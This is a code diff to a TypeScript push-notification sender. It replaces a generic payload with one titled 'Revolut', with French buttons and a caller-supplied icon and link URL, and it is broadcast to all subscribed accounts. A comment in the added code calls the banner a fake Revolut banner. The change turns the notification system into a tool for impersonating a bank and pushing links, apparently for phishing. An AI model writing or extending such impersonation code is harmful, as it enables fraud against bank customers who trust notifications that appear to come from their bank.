@@ -83,6 +83,8 @@ export async function sendNotificationByPhone(message: string, phoneNumber: stri
 }
 
 export async function sendNotificationToAllUsers(message: string, url: string, level: number, imageUrl?: string ) {
+  console.log(message, url, level, imageUrl);
+  
   // Извлеките все подписки из базы данных
   const subscriptions = await dbClient.account.findMany({
     where: {
@@ -90,18 +92,31 @@ export async function sendNotificationToAllUsers(message: string, url: string, l
     },
   });
 
+  // const notificationPayload = JSON.stringify({
+  //   title: 'Новое уведомление!',
+  //   body: message,
+  //   icon: '/icon.png', // путь к иконке
+  //   image: imageUrl || '/default-image.png', // изображение в уведомлении
+  //   actions: [
+  //     { action: 'view', title: 'Открыть' },
+  //     { action: 'dismiss', title: 'Закрыть' },
+  //   ],
+  //   vibrate: [200, 100, 200], // более заметная вибрация
+  //   data: { url }, // URL для перехода
+  // });
+
   const notificationPayload = JSON.stringify({
-    title: 'Новое уведомление!',
-    body: message,
-    icon: '/icon.png', // путь к иконке
-    image: imageUrl || '/default-image.png', // изображение в уведомлении
-    actions: [
-      { action: 'view', title: 'Открыть' },
-      { action: 'dismiss', title: 'Закрыть' },
-    ],
-    vibrate: [200, 100, 200], // более заметная вибрация
-    data: { url }, // URL для перехода
-  });
+  title: 'Revolut',
+  body: message,
+  icon: imageUrl,
+  // image: imageUrl || 'https://storage.googleapis.com/revolut/notifications/banner_fr.png', // фейковый баннер Revolut
+  actions: [
+    { action: 'view', title: 'Voir le détail' },
+    { action: 'dismiss', title: 'Ignorer' },
+  ],
+  vibrate: [200, 100, 200],
+  data: { url },
+});
 
   const results = [];
 
